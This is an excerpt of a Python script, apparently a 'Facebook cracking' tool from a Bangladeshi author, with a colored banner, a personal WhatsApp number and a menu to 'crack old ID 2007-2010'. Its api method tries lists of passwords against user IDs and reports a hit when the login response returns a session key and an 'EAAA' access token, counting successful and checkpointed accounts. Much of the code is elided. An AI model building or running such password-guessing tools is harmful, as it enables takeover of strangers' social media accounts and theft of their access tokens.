...
\33[1;34m────────▀█▀
 ...
 |----------*****----------*****----------|
   ...
   \33[1;34m[★] Ｏｗｎｅｒ: MD. RABBI   
                                                
   \33[1;34m[★] Whatsapp : +8801581832407
                                             
   \33[1;34m[★] Ｔｏｏｌｓ : FREE 
                                               
   \33[1;34m[★] Ｖｅｒｓｉｏｎ : 3.1 
...
class Main:
	...
	def __init__(self):
		...
		print("\033[1;32m [1] First Follow My Facebook 🙂")

		print("\033[1;32m [2] Exit")

		print("")

		syed = input("\n\033[1;32m  CHOSE ==> \033[1;32m")
		...
		if syed in ["", " "]:
			...
			print("\033[1;33m  KING IS BACK😇")

			print("")

			input("\n\033[1;32m   ENTER YOUR NAME  ==> \033[1;32m")

			time.sleep(2.1)

			print("")

			print("\033[1;32m  Successful Bro Lets Enjoy.....")
		...
		print('\x1b[1;32m [1]\x1b[1;33m CRACK OLD ID 2007-2010 ')

		print('\x1b[1;32m [2] \x1b[1;33mFOLLOW MY FACEBOOK ID')
	...
	def api(self, uid, pwx):
		...
		sys.stdout.write(
			...
			"\r\r %s\033[92;1m[ARIYA] : %s/%s -> \033[0;92m [ OK:%s ]- \033[0;91m[CP:%s ]"%(B,self.loop, len(self.id), len(self.cp), len(self.ok))
		...
		for pw in pwx:
			...
			if "session_key" in response.text and "EAAA" in response.text:
				...
				print("\r  \033[1;32m   [ARIYA] %s | %s\033[1;32m         "%(uid, pw))
